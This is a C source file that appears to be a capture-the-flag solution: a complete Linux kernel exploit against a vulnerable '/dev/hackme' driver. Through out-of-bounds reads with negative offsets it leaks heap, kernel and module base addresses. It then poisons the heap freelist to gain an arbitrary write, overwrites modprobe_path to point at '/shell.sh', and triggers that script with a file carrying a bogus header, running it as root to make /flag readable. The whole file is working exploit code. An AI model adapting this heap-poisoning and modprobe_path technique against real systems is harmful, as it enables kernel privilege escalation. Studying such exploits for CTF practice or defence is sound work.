#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

int fd;
size_t heap_base, vmlinux_base, mod_tree, modprobe_path, ko_base, pool_addr;

struct Heap{
    size_t index;
    char *data;
    size_t len;
    size_t offset;
};

void add(int index, size_t len, char *data)
{
	struct Heap heap;
	heap.index = index;
	heap.data = data;
	heap.len = len;
	ioctl(fd, 0x30000, &heap);
}

void delete(int index)
{
	struct Heap heap;
	heap.index = index;
	ioctl(fd, 0x30001, &heap);
}

void edit(int index, size_t len, size_t offset, char *data)
{
	struct Heap heap;
	heap.index = index;
	heap.data = data;
	heap.len = len;
	heap.offset = offset;
	ioctl(fd, 0x30002, &heap);
}

void show(int index, size_t len, size_t offset, char *data)
{
	struct Heap heap;
	heap.index = index;
	heap.data = data;
	heap.len = len;
	heap.offset = offset;
	ioctl(fd, 0x30003, &heap);
}

void get_flag()
{
	puts("[+] Prepare shell file.");
	system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /shell.sh");
	system("chmod +x /shell.sh");
	
	puts("[+] Prepare trigger file.");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /FXC");
	system("chmod +x /FXC");
	
	system("cat /proc/sys/kernel/modprobe");
	system("/FXC");
	system("cat /flag");
	
	sleep(5);
}

int main()
{
	fd = open("/dev/hackme",0);
	if(fd < 0)
	{
		puts("[-] open file error");
		sleep(3);
		exit(0);
	}

	char buf[0x1000] = {0};
	
	add(0, 0x100, buf); // 0
	add(1, 0x100, buf); // 1
	add(2, 0x100, buf); // 2
	add(3, 0x100, buf); // 3
	add(4, 0x100, buf); // 4

	delete(1);
	delete(3);

	show(4, 0x100, -0x100, buf);
	heap_base = ((size_t *)buf)[0] - 0x100;
	printf("[+] heap_addr=> 0x%lx\n", heap_base);

	show(0, 0x200, -0x200, buf);
	vmlinux_base = ((size_t *)buf)[0] - 0x8472c0;
	printf("[+] vmlinux_base=> 0x%lx\n", vmlinux_base);
	mod_tree = vmlinux_base + 0x811000;
	modprobe_path = vmlinux_base + 0x83f960;
	
	memset(buf,'\x00',0x100);
	((size_t  *)buf)[0] = mod_tree + 0x40;
	edit(4, 0x100, -0x100, buf);
	
	add(5, 0x100, buf); // 5
	add(6, 0x100, buf); // 6

	show(6, 0x40, -0x40, buf);
	ko_base = ((size_t *)buf)[3];
	printf("[+] ko_base=> 0x%lx\n", ko_base);

	delete(2);
	delete(5);

	getchar();
	((size_t  *)buf)[0] = ko_base + 0x2400 + 0xc0;
	edit(4, 0x100, -0x100, buf);

	add(7, 0x100, buf); // 7
	add(8, 0x100, buf); // 8

	((size_t  *)buf)[0] = modprobe_path;
	((size_t  *)buf)[1] = 0x100;
	edit(8, 0x10, 0, buf);

	strncpy(buf, "/shell.sh\x00", 0xa);
	edit(12, 0xa, 0, buf);

	get_flag();
	return 0;
}
